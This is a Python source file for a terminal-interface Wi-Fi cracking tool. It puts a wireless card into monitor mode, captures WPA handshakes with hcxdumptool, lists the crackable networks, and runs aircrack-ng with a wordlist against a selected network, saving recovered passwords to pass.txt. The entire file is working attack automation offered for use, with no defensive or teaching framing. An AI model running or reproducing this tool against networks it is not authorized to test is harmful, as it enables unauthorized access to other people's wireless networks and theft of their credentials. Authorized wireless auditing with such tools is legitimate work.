import subprocess
import threading
import re
import argparse
import time
import os
import getpass


from TUI import run_tui


state = {
    "networks": [],
    "all_networks": [],
    "app": None,
    "running": True,
    "lock": threading.Lock(),

    # crack state
    "cracking": False,
    "crack_target_id": None,
    "crack_wordlist": None,
    "crack_status": "Idle",
    "crack_password": None,
    "crack_process": None,
    "crack_output": [],
}

hcx_process = None
crack_process = None

BSSID_RE = re.compile(r"^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$")

SUDO_PASSWORD = None


def init_sudo(password=None, ask=False):
    global SUDO_PASSWORD

    if ask and not password:
        password = getpass.getpass("[sudo] password: ")

    if password:
        try:
            subprocess.run(
                ["sudo", "-S", "-v"],
                input=password + "\n",
                text=True,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                check=True
            )
            SUDO_PASSWORD = password
            return True
        except subprocess.CalledProcessError:
            print("[-] sudo password wrong")
            return False

    return True


def sudo_run(cmd, **kwargs):
    if SUDO_PASSWORD:
        return subprocess.run(
            ["sudo", "-S"] + cmd,
            input=SUDO_PASSWORD + "\n",
            text=True,
            **kwargs
        )

    return subprocess.run(["sudo"] + cmd, **kwargs)


def sudo_popen(cmd, **kwargs):
    if SUDO_PASSWORD:
        p = subprocess.Popen(
            ["sudo", "-S"] + cmd,
            stdin=subprocess.PIPE,
            text=True,
            **kwargs
        )

        try:
            p.stdin.write(SUDO_PASSWORD + "\n")
            p.stdin.flush()
            p.stdin.close()
        except Exception:
            pass

        return p

    return subprocess.Popen(["sudo"] + cmd, **kwargs)


def airmon_check_kill():
    sudo_run(["airmon-ng", "check", "kill"])


def airmon_run(iface):
    sudo_run(["airmon-ng", "start", iface])


def Hangging(iface):
    global hcx_process

    hcx_process = sudo_popen(
        ["hcxdumptool", "-i", iface, "-w", "capture.pcapng"],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL
    )
    hcx_process.wait()


def hashcapture():
    subprocess.run(
        ["hcxpcapngtool", "-o", "hash.22000", "capture.pcapng"],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL
    )


def fixed_capture():
    subprocess.run(
        ["tcpdump", "-r", "capture.pcapng", "-w", "fixed.cap"],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL
    )


def start_Hang(iface):
    s = threading.Thread(target=Hangging, args=(iface,), daemon=True)
    s.start()


def run_echo():
    r = subprocess.run(
        'echo "" | aircrack-ng fixed.cap',
        shell=True,
        capture_output=True,
        text=True
    )
    echo_out = r.stdout
    return echo_out


def Parse_Echo_to_Network():
    networks = []
    echo_out = run_echo()

    for line in echo_out.splitlines():
        line = line.strip()

        if not re.match(r"^\d+", line):
            continue

        parts = re.split(r"\s{2,}", line)

        if len(parts) < 3:
            continue

        if not BSSID_RE.match(parts[1]):
            continue

        try:
            net = {
                "id": parts[0],
                "bssid": parts[1],
                "essid": " ".join(parts[2:-1]) if len(parts) > 3 else "",
                "enc": parts[-1],
            }

            networks.append(net)

        except Exception:
            pass

    return networks


def merge_networks(old_networks, new_networks):
    merged = {}

    for net in old_networks:
        merged[net["bssid"]] = net.copy()

    for net in new_networks:
        bssid = net["bssid"]

        if bssid not in merged:
            merged[bssid] = net.copy()
            continue

        old = merged[bssid]

        old["id"] = net.get("id") or old.get("id")

        if net.get("essid"):
            old["essid"] = net["essid"]

        if net.get("enc"):
            old["enc"] = net["enc"]

    return sorted(
        merged.values(),
        key=lambda x: int(x["id"]) if str(x["id"]).isdigit() else 9999
    )


def FilterNetworks(Networks):
    filtered = []

    for net in Networks:
        if ("WPA" in net["enc"] and "(0 handshake)" not in net["enc"]):
            filtered.append(net)

    return filtered


def starto_loopu(isFilter):
    while state["running"]:
        hashcapture()
        fixed_capture()

        parsed_networks = Parse_Echo_to_Network()

        with state["lock"]:
            state["all_networks"] = merge_networks(
                state["all_networks"],
                parsed_networks
            )

            if isFilter:
                state["networks"] = FilterNetworks(state["all_networks"])
            else:
                state["networks"] = state["all_networks"]

        if state["app"]:
            state["app"].invalidate()

        time.sleep(5)


def refresh_app():
    if state["app"]:
        state["app"].invalidate()


def append_crack_log(msg):
    line = str(msg).rstrip()

    with state["lock"]:
        state["crack_output"].append(line)

        if len(state["crack_output"]) > 200:
            state["crack_output"] = state["crack_output"][-200:]

    refresh_app()


def extract_aircrack_password(line):
    m = re.search(r"KEY FOUND!\s*\[\s*(.*?)\s*\]", line)
    if m:
        return m.group(1)

    return None


def set_crack_status(status):
    with state["lock"]:
        state["crack_status"] = status

    #append_crack_log(f"[STATUS] {status}")


def crack_worker(wordlist):
    global crack_process

    wordlist = wordlist.strip()

    #append_crack_log(f"[*] wordlist: {wordlist}")

    if not os.path.exists("fixed.cap"):
        with state["lock"]:
            state["cracking"] = False
            state["crack_status"] = "fixed.cap not found"
            state["crack_process"] = None

        #append_crack_log("[ERR] fixed.cap not found")
        return

    if not os.path.exists(wordlist):
        with state["lock"]:
            state["cracking"] = False
            state["crack_status"] = "wordlist not found"
            state["crack_process"] = None

        #append_crack_log(f"[ERR] wordlist not found: {wordlist}")
        return

    cmd = [
        "aircrack-ng",
        "fixed.cap",
        "-w",
        wordlist
    ]

    #append_crack_log("[CMD] " + " ".join(cmd))

    with state["lock"]:
        state["cracking"] = True
        state["crack_target_id"] = None
        state["crack_wordlist"] = wordlist
        state["crack_status"] = "Waiting target ID"
        state["crack_password"] = None

    refresh_app()

    try:
        crack_process = subprocess.Popen(
            cmd,
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            bufsize=1
        )

        with state["lock"]:
            state["crack_process"] = crack_process

        #append_crack_log(f"[PID] {crack_process.pid}")
        #append_crack_log("[*] aircrack-ng started")
        #append_crack_log("[*] waiting for target ID...")

        for line in crack_process.stdout:
            line = line.rstrip()
            #append_crack_log(line)

            password = extract_aircrack_password(line)

            if password:
                with state["lock"]:
                    state["crack_password"] = password
                    state["crack_status"] = f"FOUND: {password}"

                #append_crack_log(f"[FOUND] {password}")
                refresh_app()

            elif "KEY NOT FOUND" in line.upper():
                with state["lock"]:
                    state["crack_status"] = "KEY NOT FOUND"

                #append_crack_log("[KEY NOT FOUND]")
                refresh_app()

        crack_process.wait()
        #append_crack_log(f"[EXIT] {crack_process.returncode}")

        with state["lock"]:
            if state["crack_password"]:
                state["crack_status"] = f"FOUND: {state['crack_password']}"
            elif state["crack_status"] == "KEY NOT FOUND":
                pass
            elif state["cracking"]:
                state["crack_status"] = "Finished"

    except Exception as e:
        #append_crack_log(f"[EXCEPTION] {e}")

        with state["lock"]:
            state["crack_status"] = f"Error: {e}"

    finally:
        with state["lock"]:
            state["cracking"] = False
            state["crack_process"] = None

        crack_process = None
        refresh_app()


def normalize_path(path):
    return os.path.abspath(
        os.path.expandvars(
            os.path.expanduser(path.strip())
        )
    )


def start_crack(wordlist):
    wordlist = normalize_path(wordlist)

    if not wordlist:
        set_crack_status("Empty wordlist")
        return

    with state["lock"]:
        if state["cracking"]:
            state["crack_status"] = "Already cracking"
            state["crack_output"].append("[ERR] Already cracking")
            return

        state["cracking"] = True
        state["crack_target_id"] = None
        state["crack_wordlist"] = wordlist
        state["crack_status"] = "Starting aircrack-ng..."
        state["crack_password"] = None
        state["crack_output"] = [
            f"[*] wordlist: {wordlist}",
            "[*] starting aircrack-ng...",
        ]

    t = threading.Thread(
        target=crack_worker,
        args=(wordlist,),
        daemon=True
    )

    t.start()
    refresh_app()


def send_crack_id(target_id):
    target_id = str(target_id).strip()

    if not target_id:
        set_crack_status("Empty target ID")
        return

    p = None

    for _ in range(30):
        with state["lock"]:
            p = state.get("crack_process")

        if p:
            break

        time.sleep(0.1)

    if not p:
        set_crack_status("aircrack-ng not ready")
        ##append_crack_log("[ERR] crack_process is None")
        return

    if p.poll() is not None:
        set_crack_status("aircrack-ng already exited")
        ##append_crack_log("[ERR] process already exited")
        return

    try:
        p.stdin.write(target_id + "\n")
        p.stdin.flush()

        with state["lock"]:
            state["crack_target_id"] = target_id
            state["crack_status"] = "Cracking..."

        ##append_crack_log(f"[SEND ID] {target_id}")
        refresh_app()

    except Exception as e:
        set_crack_status(f"send ID failed: {e}")
        ##append_crack_log(f"[ERR SEND ID] {e}")


def save_password_to_file():
    with state["lock"]:
        password = state.get("crack_password")
        target_id = state.get("crack_target_id")
        wordlist = state.get("crack_wordlist")

    if not password:
        with state["lock"]:
            state["crack_status"] = "No password to save"

        #append_crack_log("[ERR] no password to save")
        refresh_app()
        return False

    line = f"id={target_id or 'None'} | password={password} | wordlist={wordlist or 'None'}\n"

    try:
        with open("pass.txt", "a", encoding="utf-8") as f:
            f.write(line)

        with state["lock"]:
            state["crack_status"] = "Saved to pass.txt"

        #append_crack_log(f"[SAVED] {line.strip()}")
        refresh_app()
        return True

    except Exception as e:
        with state["lock"]:
            state["crack_status"] = f"Save failed: {e}"

        #append_crack_log(f"[ERR SAVE] {e}")
        refresh_app()
        return False


def stop_crack():
    global crack_process

    with state["lock"]:
        p = state.get("crack_process")

    if p:
        try:
            p.terminate()
        except Exception:
            pass

    if crack_process:
        try:
            crack_process.terminate()
        except Exception:
            pass

    with state["lock"]:
        state["cracking"] = False
        state["crack_process"] = None
        state["crack_status"] = "Stopped"

    crack_process = None
    #append_crack_log("[*] stopped")
    refresh_app()


def cleanup(Is_Monitor=False):
    temp_file = [
        "capture.pcapng",
        "fixed.cap",
        "hash.22000"
    ]

    for file in temp_file:
        try:
            if os.path.exists(file):
                os.remove(file)
        except:
            print("You delete the created file after quit, or this code won't work anymore!!!!!\n")
            pass

    if Is_Monitor:
        try:
            sudo_run(["systemctl", "start", "NetworkManager"])
        except:
            print("Turn on your Network or You cant use it!!!")


def quit_program(Is_Monitor=False):
    global hcx_process
    global crack_process

    state["running"] = False

    stop_crack()

    if hcx_process:
        try:
            hcx_process.terminate()
        except:
            pass

    cleanup(Is_Monitor)


def main():
    parser = argparse.ArgumentParser()

    parser.add_argument("-i", "--interface", default="wlan0", help="Wifi interface (wlan0, wlan0mon, wlan1mon, wlp2s0mon)")

    parser.add_argument("-m", "--monitor", action="store_true", help="Start monitor mode before capture")

    parser.add_argument("-f", "--filter", action="store_true", help="Only show crackable Network")

    parser.add_argument("--ask-sudo", action="store_true", help="Ask sudo password securely")

    parser.add_argument("--sudo-pass", default=None, help="Pass sudo password directly, not recommended")

    args = parser.parse_args()

    if args.ask_sudo or args.sudo_pass:
        ok = init_sudo(password=args.sudo_pass, ask=args.ask_sudo)
        if not ok:
            return

    iface = args.interface

    if args.monitor:
        airmon_check_kill()
        airmon_run(iface)

        # if not iface.endswith("mon"):
        #     iface = iface + "mon"
    else:
        iface = args.interface

    try:
        start_Hang(iface)

        process_thread = threading.Thread(
            target=starto_loopu,
            args=(args.filter,),
            daemon=True
        )
        process_thread.start()

        state["start_crack"] = start_crack
        state["send_crack_id"] = send_crack_id
        state["stop_crack"] = stop_crack
        state["save_password"] = save_password_to_file

        run_tui(
            state=state,
            iface=iface,
            is_filter=args.filter,
            is_monitor=args.monitor,
            quit_callback=lambda: quit_program(args.monitor)
        )

    except KeyboardInterrupt:
        quit_program(args.monitor)


if __name__ == "__main__":
    main()